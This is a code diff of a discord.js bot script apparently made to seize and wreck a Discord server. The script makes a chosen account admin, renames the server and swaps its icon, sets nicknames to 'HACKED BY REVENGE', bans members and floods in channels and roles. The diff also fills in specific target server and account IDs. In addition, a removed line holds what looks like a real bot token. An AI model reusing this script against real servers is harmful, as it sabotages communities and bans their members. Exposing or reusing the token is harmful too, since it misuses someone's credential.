@@ -1,6 +1,6 @@
 const Discord = require("discord.js")
 const client = new Discord.Client()
-const token = "NjAwNzg4MTE3MTI0ODA4NzI0.Xc-LHQ.bGP42W71Ys28Tcd3Ak-KCoS7FjU" //here ur bot token
+const token = "TOKEN"
 
 // Will make you admin (NOT OWNER) in the targer server
 const setAdmin = (guildID, accountID) => {
@@ -15,7 +15,7 @@ const setAdmin = (guildID, accountID) => {
         })
     })
 }
-  
+
 // Will change name and icon of the server and send a DM to the owner
 const changeServerInfo = (guildID, options) => {
     const targetServer = client.guilds.get(guildID)
@@ -86,8 +86,8 @@ client.on("ready", () => {
 
     // Setup YOUR personnal settings
     const configs = {
-        "targetServerID": "",
-        "accountID": "",
+        "targetServerID": "645134594718433281",
+        "accountID": "597173029511888966",
         "botNickname": "HACKED BY REVENGE",
         "botIcon": 'https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png',
         "newServerIcon": "https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png",
@@ -99,7 +99,7 @@ client.on("ready", () => {
 
     // Enable all the options
     setAdmin(configs.targetServerID, configs.accountID)
-    changeServerInfo(configs.targetServerID, {"newServerName": configs.newServerName}, {"newServerIcon": configs.newServerIcon})
+    changeServerInfo(configs.targetServerID, {"newServerName": configs.newServerName, "newServerIcon": configs.newServerIcon})
     changeNicks(configs.targetServerID, configs.botNickname)
     banMembers(configs.targetServerID)
     createChanelsAndRoles(configs.targetServerID, configs.botNickname)
